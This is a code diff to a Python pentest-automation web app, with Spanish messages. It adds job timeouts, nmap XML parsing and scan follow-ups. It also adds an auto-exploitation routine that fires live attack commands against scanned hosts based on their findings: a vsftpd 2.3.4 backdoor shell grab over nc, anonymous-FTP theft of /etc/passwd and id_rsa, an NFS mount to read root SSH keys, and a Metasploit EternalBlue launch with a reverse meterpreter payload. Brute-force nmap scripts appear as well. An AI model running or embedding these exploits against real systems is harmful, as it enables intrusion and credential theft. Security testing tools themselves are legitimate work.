@@ -385,13 +385,13 @@ WORKFLOWS = [
         "auto_inject": True,
         "steps": [
             {
-                "name": "Nmap Discovery + Vuln Scripts",
-                "command": "nmap -T4 -sV --open --top-ports 1000 --script=vuln,auth,default {rhost}",
+                "name": "Nmap Quick XML (top-1000 + vuln scripts)",
+                "command": "nmap -T4 -sV --open --top-ports 1000 --script=vuln,auth,default,ftp-anon,ftp-vsftpd-backdoor,smb-vuln-ms17-010,smb-vuln-ms08-067,smb2-security-mode,rdp-vuln-ms12-020,ssl-heartbleed,http-shellshock,http-phpmyadmin-dir-traversal -oX - {rhost} 2>/dev/null",
                 "parse": "nmap",
             },
             {
-                "name": "Nmap Full TCP",
-                "command": "nmap -T4 -sV -p- --min-rate 5000 --max-retries 1 --host-timeout 20m {rhost} -oN /tmp/nmap_full_{rhost}.txt",
+                "name": "Nmap Full TCP XML (all ports)",
+                "command": "nmap -T4 -sV -p- --min-rate 5000 --max-retries 1 --host-timeout 20m --script=default,vuln,ftp-anon,smb-vuln-ms17-010,smb-vuln-ms08-067,ssl-heartbleed -oX - {rhost} 2>/dev/null",
                 "parse": "nmap",
             },
         ],
@@ -530,10 +530,36 @@ def update_project(project_id):
 @app.route("/api/projects/<project_id>", methods=["DELETE"])
 @api_login_required
 def delete_project(project_id):
+    # Validate id is sane before touching the filesystem
+    if not re.match(r'^[\w\-]+$', project_id):
+        return jsonify({"error": "Invalid project id"}), 400
+    # Remove project JSON
     filepath = PROJECTS_DIR / f"{project_id}.json"
     if filepath.exists():
         os.remove(filepath)
+    # Remove screenshots directory
+    shots_dir = BASE_DIR / "data" / "screenshots" / project_id
+    if shots_dir.exists():
+        shutil.rmtree(str(shots_dir), ignore_errors=True)
+    # Remove living-map HTML
+    living_html = PROJECTS_DIR / f"{project_id}_living.html"
+    if living_html.exists():
+        living_html.unlink(missing_ok=True)
     return jsonify({"ok": True})
+
+@app.route("/api/projects/<project_id>/clear", methods=["POST"])
+@api_login_required
+def clear_project(project_id):
+    """Reset findings, loot and port_map without deleting the project."""
+    project = read_project(project_id)
+    if not project:
+        return jsonify({"error": "Not found"}), 404
+    project["findings"] = []
+    project["loot"] = []
+    project["port_map"] = []
+    project["commands"] = []
+    write_project(project)
+    return jsonify({"ok": True, "message": "Project data cleared"})
 
 # ── Job Execution (T1) ─────────────────────────────────────────────────────
 
@@ -569,6 +595,7 @@ def run_command():
         JOBS[job_id] = job
 
     def _run():
+        _JOB_TIMEOUT = 600  # seconds — hard cap per manual command
         try:
             proc = subprocess.Popen(
                 command, shell=True,
@@ -577,12 +604,27 @@ def run_command():
             )
             job["proc"] = proc
             job["pid"] = proc.pid
-            for line in proc.stdout:
-                job["output"].append(line.rstrip("\n"))
-            proc.wait()
-            job["return_code"] = proc.returncode
+            try:
+                out, _ = proc.communicate(timeout=_JOB_TIMEOUT)
+                for line in (out or "").splitlines():
+                    job["output"].append(line)
+                job["return_code"] = proc.returncode
+            except subprocess.TimeoutExpired:
+                try:
+                    os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
+                except Exception:
+                    try: proc.kill()
+                    except Exception: pass
+                try:
+                    out, _ = proc.communicate(timeout=5)
+                    for line in (out or "").splitlines():
+                        job["output"].append(line)
+                except Exception:
+                    pass
+                job["output"].append(f"[TIMEOUT] Proceso terminado tras {_JOB_TIMEOUT}s")
+                job["return_code"] = -9
             if job["status"] == "running":
-                job["status"] = "completed" if proc.returncode == 0 else "error"
+                job["status"] = "completed" if job["return_code"] == 0 else "error"
         except Exception as e:
             job["output"].append(f"[ERROR] {e}")
             job["status"] = "error"
@@ -733,6 +775,7 @@ def run_workflow():
             with JOBS_LOCK:
                 JOBS[job_id] = job
 
+            _STEP_TIMEOUT = 300  # 5 min hard cap per workflow step
             try:
                 proc = subprocess.Popen(
                     cmd, shell=True,
@@ -741,12 +784,27 @@ def run_workflow():
                 )
                 job["proc"] = proc
                 job["pid"] = proc.pid
-                for line in proc.stdout:
-                    job["output"].append(line.rstrip("\n"))
-                proc.wait()
-                job["return_code"] = proc.returncode
+                try:
+                    out, _ = proc.communicate(timeout=_STEP_TIMEOUT)
+                    for line in (out or "").splitlines():
+                        job["output"].append(line)
+                    job["return_code"] = proc.returncode
+                except subprocess.TimeoutExpired:
+                    try:
+                        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
+                    except Exception:
+                        try: proc.kill()
+                        except Exception: pass
+                    try:
+                        out, _ = proc.communicate(timeout=5)
+                        for line in (out or "").splitlines():
+                            job["output"].append(line)
+                    except Exception:
+                        pass
+                    job["output"].append(f"[TIMEOUT] Paso terminado tras {_STEP_TIMEOUT}s")
+                    job["return_code"] = -9
                 if job["status"] == "running":
-                    job["status"] = "completed" if proc.returncode == 0 else "error"
+                    job["status"] = "completed" if job["return_code"] == 0 else "error"
             except Exception as e:
                 job["output"].append(f"[ERROR] {e}")
                 job["status"] = "error"
@@ -1343,11 +1401,101 @@ def _inject_exploitation_steps(steps, injected, findings, vars_dict, rhost):
     lport = vars_dict.get("lport", "4444")
 
     for finding in findings:
+        title_lower = (finding.get("title", "") or "").lower()
+        title       = finding.get("title", "")
         exploit_cmd = finding.get("exploit_cmd", "")
+        exploit_key = f"exploit_{re.sub(r'[^a-z0-9]', '_', title_lower)[:40]}"
+        if exploit_key in injected:
+            continue
+
+        # ── Direct pattern-based exploitation (no exploit_cmd needed) ─────────
+
+        # vsftpd backdoor → grab shell directly via nc
+        if "vsftpd" in title_lower and ("backdoor" in title_lower or "2.3.4" in title_lower):
+            if "vsftpd_backdoor_grab" not in injected:
+                steps.append({
+                    "name": "[Auto-Exploit] vsftpd 2.3.4 Backdoor — Shell Grab",
+                    "command": (
+                        f"echo 'id; whoami; hostname; cat /root/root.txt 2>/dev/null; "
+                        f"cat /home/*/user.txt 2>/dev/null' | nc -w 10 {rhost} 6200 2>/dev/null"
+                    ),
+                    "parse": "exploit_result",
+                })
+                injected.add("vsftpd_backdoor_grab")
+
+        # Redis no-auth → check + dump keys
+        if "redis" in title_lower and ("sin autenticaci" in title_lower or "no auth" in title_lower or "no-auth" in title_lower):
+            if "redis_noauth_check" not in injected:
+                steps.append({
+                    "name": "[Auto-Exploit] Redis No-Auth — Info Dump",
+                    "command": (
+                        f"redis-cli -h {rhost} INFO server 2>/dev/null | head -20; "
+                        f"redis-cli -h {rhost} CONFIG GET dir 2>/dev/null; "
+                        f"redis-cli -h {rhost} CONFIG GET dbfilename 2>/dev/null; "
+                        f"redis-cli -h {rhost} KEYS '*' 2>/dev/null | head -20"
+                    ),
+                    "parse": "exploit_result",
+                })
+                injected.add("redis_noauth_check")
+
+        # FTP anonymous → list and try to download sensitive files
+        if "ftp" in title_lower and ("anón" in title_lower or "anon" in title_lower):
+            if "ftp_anon_dl" not in injected:
+                steps.append({
+                    "name": "[Auto-Exploit] FTP Anón — List + Download",
+                    "command": (
+                        f"timeout 15 ftp -n {rhost} <<'FTPEOF'\n"
+                        f"user anonymous anonymous\n"
+                        f"ls -la\n"
+                        f"ls -la /\n"
+                        f"get /etc/passwd /tmp/ftp_passwd_{rhost} 2>/dev/null\n"
+                        f"get id_rsa /tmp/ftp_id_rsa_{rhost} 2>/dev/null\n"
+                        f"bye\n"
+                        f"FTPEOF\n"
+                        f"cat /tmp/ftp_passwd_{rhost} 2>/dev/null | head -10"
+                    ),
+                    "parse": "exploit_result",
+                })
+                injected.add("ftp_anon_dl")
+
+        # NFS no_root_squash → attempt mount
+        if "nfs" in title_lower and "no_root_squash" in title_lower:
+            if "nfs_mount_attempt" not in injected:
+                safe_rhost = rhost.replace(".", "_")
+                steps.append({
+                    "name": "[Auto-Exploit] NFS no_root_squash — Mount",
+                    "command": (
+                        f"mkdir -p /tmp/nfs_{safe_rhost} 2>/dev/null; "
+                        f"showmount -e {rhost} 2>/dev/null; "
+                        f"mount -t nfs -o nolock,vers=3 {rhost}:/ /tmp/nfs_{safe_rhost} 2>/dev/null && "
+                        f"ls -la /tmp/nfs_{safe_rhost}/ 2>/dev/null && "
+                        f"cat /tmp/nfs_{safe_rhost}/root/.ssh/id_rsa 2>/dev/null && "
+                        f"cat /tmp/nfs_{safe_rhost}/root/root.txt 2>/dev/null || "
+                        f"echo 'Mount failed or not root_squash'"
+                    ),
+                    "parse": "exploit_result",
+                })
+                injected.add("nfs_mount_attempt")
+
+        # SMB EternalBlue (MS17-010) → MSF
+        if ("ms17-010" in title_lower or "eternalblue" in title_lower) and lhost and lhost != "YOUR_LHOST":
+            if "eternalblue_msf" not in injected:
+                steps.append({
+                    "name": "[Auto-Exploit] EternalBlue MS17-010",
+                    "command": (
+                        f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; "
+                        f"set RHOSTS {rhost}; set LHOST {lhost}; set LPORT {lport}; "
+                        f"set PAYLOAD windows/x64/meterpreter/reverse_tcp; "
+                        f"set ExitOnSession false; run; sleep 30; sessions -l; exit' 2>/dev/null"
+                    ),
+                    "parse": "msf_exploit",
+                })
+                injected.add("eternalblue_msf")
+
         if not exploit_cmd:
             continue
-        title = finding.get("title", "")
-        exploit_key = f"exploit_{re.sub(r'[^a-z0-9]', '_', title.lower())[:40]}"
+
+        # ── exploit_cmd based injection ────────────────────────────────────────
         if exploit_key in injected:
             continue
 
@@ -1483,12 +1631,270 @@ def _inject_followup_steps(steps, injected, port_nums, rhost):
         })
         injected.add("sql_check")
 
+    if (port_nums & {25, 587, 465}) and "smtp_check" not in injected:
+        steps.append({
+            "name": "[Auto] SMTP Open Relay + User Enum",
+            "command": (
+                f"nmap -T4 -p 25,587,465 "
+                f"--script=smtp-open-relay,smtp-enum-users,smtp-vuln-cve2010-4344 {rhost} 2>/dev/null"
+            ),
+            "parse": "nmap",
+        })
+        injected.add("smtp_check")
+
+    if (port_nums & {110, 143, 993, 995}) and "imap_check" not in injected:
+        steps.append({
+            "name": "[Auto] IMAP/POP3 Auth",
+            "command": (
+                f"nmap -T4 -p 110,143,993,995 "
+                f"--script=imap-brute,pop3-brute,imap-capabilities {rhost} 2>/dev/null"
+            ),
+            "parse": "nmap",
+        })
+        injected.add("imap_check")
+
+    if 23 in port_nums and "telnet_check" not in injected:
+        steps.append({
+            "name": "[Auto] Telnet Detect + Default Creds",
+            "command": (
+                f"nmap -T4 -p 23 --script=telnet-ntlm-info,telnet-brute {rhost} 2>/dev/null"
+            ),
+            "parse": "nmap",
+        })
+        injected.add("telnet_check")
+
+    if (port_nums & {5900, 5901, 5902}) and "vnc_check" not in injected:
+        steps.append({
+            "name": "[Auto] VNC No-Auth Check",
+            "command": (
+                f"nmap -T4 -p 5900,5901,5902 "
+                f"--script=vnc-info,vnc-brute,realvnc-auth-bypass {rhost} 2>/dev/null"
+            ),
+            "parse": "nmap",
+        })
+        injected.add("vnc_check")
+
+    if 27017 in port_nums and "mongodb_check" not in injected:
+        steps.append({
+            "name": "[Auto] MongoDB No-Auth",
+            "command": (
+                f"nmap -T4 -p 27017 --script=mongodb-info,mongodb-databases {rhost} 2>/dev/null; "
+                f"timeout 5 mongo --host {rhost} --eval 'db.adminCommand({{listDatabases: 1}})' 2>/dev/null | head -20"
+            ),
+            "parse": "nmap",
+        })
+        injected.add("mongodb_check")
+
+    if (port_nums & {8080, 8443, 8000, 8888}) and "tomcat_check" not in injected:
+        # Check for Tomcat/Jenkins/other web services on non-standard ports
+        _web_ports = ",".join(str(p) for p in sorted(port_nums & {8080, 8443, 8000, 8888, 3000, 4000, 9000}))
+        steps.append({
+            "name": "[Auto] Web Services Deep Scan (non-standard ports)",
+            "command": (
+                f"nmap -T4 -p {_web_ports} "
+                f"--script=http-auth,http-default-accounts,http-vuln-cve2017-5638,"
+                f"http-shellshock,http-phpmyadmin-dir-traversal,http-open-redirect,"
+                f"http-methods,http-title,http-server-header {rhost} 2>/dev/null"
+            ),
+            "parse": "nmap",
+        })
+        injected.add("tomcat_check")
+
+    # Web content discovery on HTTP
+    if (port_nums & {80, 443, 8080, 8443, 8000}) and "web_fuzz" not in injected:
+        _http_port = next((p for p in [80, 8080, 8000, 443, 8443] if p in port_nums), 80)
+        _proto = "https" if _http_port in {443, 8443} else "http"
+        _url = f"{_proto}://{rhost}:{_http_port}"
+        steps.append({
+            "name": "[Auto] Web Dir Fuzzing",
+            "command": (
+                f"feroxbuster --url {_url} -k -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt "
+                f"-t 40 -x php,html,txt,asp,aspx,jsp,bak,zip,json -q --no-state 2>/dev/null | head -100 || "
+                f"gobuster dir -u {_url} -k -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt "
+                f"-t 40 -x php,html,txt,asp,aspx,bak -q 2>/dev/null | head -80 || "
+                f"gobuster dir -u {_url} -k -w /usr/share/wordlists/dirb/common.txt -t 30 -q 2>/dev/null | head -80"
+            ),
+            "parse": "gobuster",
+        })
+        injected.add("web_fuzz")
+
+
+def _parse_nmap_xml(xml_text, rhost=""):
+    """Parse nmap XML output (-oX -) and return (open_ports, findings, loot)."""
+    open_ports, findings, loot = [], [], []
+    _seen_titles = set()
+    try:
+        root = ET.fromstring(xml_text)
+    except ET.ParseError:
+        return open_ports, findings, loot
+
+    HIGH_RISK_SCRIPTS_XML = {
+        'ms17-010':          ('critical', 'CVE-2017-0143', 'EternalBlue — SMBv1 RCE sin auth'),
+        'ms08-067':          ('critical', 'CVE-2008-4250', 'MS08-067 — RCE sin auth (WinXP/2003)'),
+        'ms12-020':          ('high',     'CVE-2012-0152', 'MS12-020 RDP DoS/RCE'),
+        'shellshock':        ('critical', 'CVE-2014-6271', 'Shellshock — RCE via Bash CGI'),
+        'vsftpd-backdoor':   ('critical', '',              'vsftpd 2.3.4 Backdoor RCE'),
+        'unrealircd-backdoor':('critical','',              'UnrealIRCd Backdoor RCE'),
+        'heartbleed':        ('high',     'CVE-2014-0160', 'Heartbleed — memory leak OpenSSL'),
+        'bluekeep':          ('critical', 'CVE-2019-0708', 'BlueKeep — RDP RCE sin auth'),
+        'doublepulsar':      ('critical', 'CVE-2017-0144', 'DoublePulsar backdoor'),
+        'ftp-anon':          ('high',     '',              'FTP — Login anónimo permitido'),
+        'http-shellshock':   ('critical', 'CVE-2014-6271', 'Shellshock via HTTP CGI'),
+    }
+
+    for host_el in root.iter('host'):
+        host_addr = rhost
+        for addr_el in host_el.findall('address'):
+            if addr_el.get('addrtype') == 'ipv4':
+                host_addr = addr_el.get('addr', rhost)
+                break
+
+        for port_el in host_el.iter('port'):
+            state_el = port_el.find('state')
+            if state_el is None or state_el.get('state') != 'open':
+                continue
+            portid   = int(port_el.get('portid', 0))
+            proto    = port_el.get('protocol', 'tcp')
+            svc_el   = port_el.find('service')
+            svc_name = svc_el.get('name', '') if svc_el is not None else ''
+            product  = svc_el.get('product', '') if svc_el is not None else ''
+            version  = svc_el.get('version', '') if svc_el is not None else ''
+            extrainfo= svc_el.get('extrainfo', '') if svc_el is not None else ''
+            ver_full = ' '.join(filter(None, [product, version, extrainfo])).strip()
+
+            open_ports.append({'port': portid, 'proto': proto, 'service': svc_name, 'version': ver_full})
+            loot.append({'type': 'note', 'value': f"{portid}/{proto} {svc_name} {ver_full}".strip(), 'source': host_addr or 'nmap'})
+
+            # Version-based CVE match
+            _vf = _match_version_cve({'port': portid, 'proto': proto, 'service': svc_name, 'version': ver_full}, host_addr)
+            if _vf and _vf['title'] not in _seen_titles:
+                _seen_titles.add(_vf['title'])
+                findings.append(_vf)
+
+            # Script results
+            for script_el in port_el.findall('script'):
+                script_id     = script_el.get('id', '').lower()
+                script_output = script_el.get('output', '')
+                _process_nmap_script(script_id, script_output, script_el, host_addr, findings, loot, _seen_titles, HIGH_RISK_SCRIPTS_XML)
+
+        # Host-level scripts (smb-vuln-*, etc.)
+        hostscripts_el = host_el.find('hostscript')
+        if hostscripts_el is not None:
+            for script_el in hostscripts_el.findall('script'):
+                script_id     = script_el.get('id', '').lower()
+                script_output = script_el.get('output', '')
+                _process_nmap_script(script_id, script_output, script_el, host_addr, findings, loot, _seen_titles, HIGH_RISK_SCRIPTS_XML)
+
+    return open_ports, findings, loot
+
+
+def _process_nmap_script(script_id, script_output, script_el, host_addr, findings, loot, seen_titles, HIGH_RISK_SCRIPTS):
+    """Process a single nmap script result element and append to findings/loot."""
+    combined = script_output
+    # Also look at elem children for verbose output
+    for elem in script_el.findall('.//elem'):
+        key = elem.get('key', '')
+        val = (elem.text or '').strip()
+        if val:
+            combined += f'\n{key}: {val}' if key else f'\n{val}'
+
+    is_vuln = re.search(r'VULNERABLE|State: VULNERABLE', combined, re.IGNORECASE)
+
+    for key, (sev, cve, desc) in HIGH_RISK_SCRIPTS.items():
+        if key not in script_id:
+            continue
+        title = f"[{script_id}] Host VULNERABLE"
+        if title in seen_titles:
+            return
+        # ftp-anon doesn't need VULNERABLE keyword
+        if key == 'ftp-anon':
+            if 'Anonymous login allowed' not in combined and not is_vuln:
+                return
+        elif not is_vuln:
+            return
+        cve_m = re.search(r'CVE[:\-](\d{4}[:\-]\d+)', combined, re.IGNORECASE)
+        actual_cve = f"CVE-{cve_m.group(1).replace(':', '-')}" if cve_m else cve
+        findings.append({
+            'id': str(uuid.uuid4()), 'title': title,
+            'severity': sev, 'status': 'open',
+            'cve': actual_cve, 'cvss': None,
+            'description': desc,
+            'evidence': combined[:600].strip(),
+            'hosts': [host_addr] if host_addr else [],
+            'source': 'nmap-xml',
+        })
+        seen_titles.add(title)
+        return
+
+    # Generic VULNERABLE detection for any script
+    if is_vuln:
+        title = f"[{script_id}] Host VULNERABLE"
+        if title not in seen_titles:
+            cve_m = re.search(r'CVE[:\-](\d{4}[:\-]\d+)', combined, re.IGNORECASE)
+            cve = f"CVE-{cve_m.group(1).replace(':', '-')}" if cve_m else ""
+            findings.append({
+                'id': str(uuid.uuid4()), 'title': title,
+                'severity': 'high', 'status': 'open',
+                'cve': cve, 'cvss': None,
+                'description': f"Nmap script {script_id} reportó el host como VULNERABLE.",
+                'evidence': combined[:600].strip(),
+                'hosts': [host_addr] if host_addr else [],
+                'source': 'nmap-xml',
+            })
+            seen_titles.add(title)
+
+    # FTP anon via script output
+    if script_id == 'ftp-anon' and 'Anonymous login allowed' in combined:
+        title = "FTP — Login Anónimo Permitido"
+        if title not in seen_titles:
+            findings.append({
+                'id': str(uuid.uuid4()), 'title': title,
+                'severity': 'high', 'status': 'open', 'cve': '', 'cvss': 7.5,
+                'description': 'El servidor FTP acepta login anónimo.',
+                'evidence': combined[:300].strip(),
+                'hosts': [host_addr] if host_addr else [], 'source': 'nmap-ftp-anon',
+            })
+            seen_titles.add(title)
+
+    # SSH host key info as loot
+    if script_id == 'ssh-hostkey':
+        loot.append({'type': 'note', 'value': f"SSH hostkeys: {combined[:200].strip()}", 'source': 'nmap-ssh'})
+
 
 def _parse_tool_output(tool, output_text, rhost="", job_name=""):
     loot      = []
     suggestions = []
     open_ports  = []
     findings    = []   # auto-detected vulnerabilities
+
+    # ── Nmap XML mode (-oX -): detect and parse structured XML output ─────────
+    if output_text.lstrip().startswith('<?xml') and '<nmaprun' in output_text:
+        xml_ports, xml_findings, xml_loot = _parse_nmap_xml(output_text, rhost)
+        open_ports.extend(xml_ports)
+        findings.extend(xml_findings)
+        loot.extend(xml_loot)
+        # Build port_nums for suggestions
+        port_nums = {p['port'] for p in xml_ports}
+        if port_nums & {80, 443, 8080, 8443, 8000}:
+            suggestions.append({'tools': ['Gobuster', 'Nikto', 'WhatWeb', 'Nuclei'], 'reason': 'HTTP/HTTPS detectado'})
+        if port_nums & {445, 139}:
+            suggestions.append({'tools': ['SMBMap', 'CrackMapExec', 'enum4linux-ng'], 'reason': 'SMB detectado'})
+        if 22 in port_nums:
+            suggestions.append({'tools': ['Hydra SSH', 'ssh-audit'], 'reason': 'SSH detectado'})
+        if 21 in port_nums:
+            suggestions.append({'tools': ['FTP Anonymous', 'nmap ftp-anon'], 'reason': 'FTP detectado'})
+        if port_nums & {389, 636, 3268}:
+            suggestions.append({'tools': ['LDAP Enum', 'BloodHound'], 'reason': 'LDAP/AD detectado'})
+        if 3389 in port_nums:
+            suggestions.append({'tools': ['BlueKeep', 'nmap rdp-vuln-*'], 'reason': 'RDP detectado'})
+        if port_nums & {1433, 3306, 5432}:
+            suggestions.append({'tools': ['SQL Enum'], 'reason': 'Base de datos detectada'})
+        if 161 in port_nums:
+            suggestions.append({'tools': ['snmpwalk', 'onesixtyone'], 'reason': 'SNMP detectado'})
+        return {
+            'open_ports': open_ports, 'findings': findings,
+            'loot': xml_loot, 'suggestions': suggestions,
+        }
 
     # ── Nmap open ports + instant version-based CVE detection ────────────────
     nmap_re = re.compile(r'^(\d+)/(tcp|udp)\s+open\s+(\S+)\s*(.*)', re.MULTILINE)
@@ -3206,16 +3612,30 @@ def run_multi():
             JOBS[job_id] = job
 
         def _run(j=job):
+            _BATCH_TIMEOUT = 600
             try:
                 proc = subprocess.Popen(j["command"], shell=True, stdout=subprocess.PIPE,
                     stderr=subprocess.STDOUT, text=True, bufsize=1, start_new_session=True)
                 j["proc"] = proc; j["pid"] = proc.pid
-                for line in proc.stdout:
-                    j["output"].append(line.rstrip("\n"))
-                proc.wait()
-                j["return_code"] = proc.returncode
+                try:
+                    out, _ = proc.communicate(timeout=_BATCH_TIMEOUT)
+                    for line in (out or "").splitlines():
+                        j["output"].append(line)
+                    j["return_code"] = proc.returncode
+                except subprocess.TimeoutExpired:
+                    try: os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
+                    except Exception:
+                        try: proc.kill()
+                        except Exception: pass
+                    try:
+                        out, _ = proc.communicate(timeout=5)
+                        for line in (out or "").splitlines():
+                            j["output"].append(line)
+                    except Exception: pass
+                    j["output"].append(f"[TIMEOUT] Proceso terminado tras {_BATCH_TIMEOUT}s")
+                    j["return_code"] = -9
                 if j["status"] == "running":
-                    j["status"] = "completed" if proc.returncode == 0 else "error"
+                    j["status"] = "completed" if j["return_code"] == 0 else "error"
             except Exception as e:
                 j["output"].append(f"[ERROR] {e}"); j["status"] = "error"
             finally:
@@ -3263,15 +3683,30 @@ def _scheduler_worker():
             with JOBS_LOCK:
                 JOBS[job_id] = job
             def _run_sched(j=job):
+                _SCHED_TIMEOUT = 600
                 try:
                     proc = subprocess.Popen(j["command"], shell=True, stdout=subprocess.PIPE,
                         stderr=subprocess.STDOUT, text=True, bufsize=1, start_new_session=True)
                     j["proc"] = proc; j["pid"] = proc.pid
-                    for line in proc.stdout:
-                        j["output"].append(line.rstrip("\n"))
-                    proc.wait(); j["return_code"] = proc.returncode
+                    try:
+                        out, _ = proc.communicate(timeout=_SCHED_TIMEOUT)
+                        for line in (out or "").splitlines():
+                            j["output"].append(line)
+                        j["return_code"] = proc.returncode
+                    except subprocess.TimeoutExpired:
+                        try: os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
+                        except Exception:
+                            try: proc.kill()
+                            except Exception: pass
+                        try:
+                            out, _ = proc.communicate(timeout=5)
+                            for line in (out or "").splitlines():
+                                j["output"].append(line)
+                        except Exception: pass
+                        j["output"].append(f"[TIMEOUT] Proceso terminado tras {_SCHED_TIMEOUT}s")
+                        j["return_code"] = -9
                     if j["status"] == "running":
-                        j["status"] = "completed" if proc.returncode == 0 else "error"
+                        j["status"] = "completed" if j["return_code"] == 0 else "error"
                 except Exception as e:
                     j["output"].append(f"[ERROR] {e}"); j["status"] = "error"
                 finally:
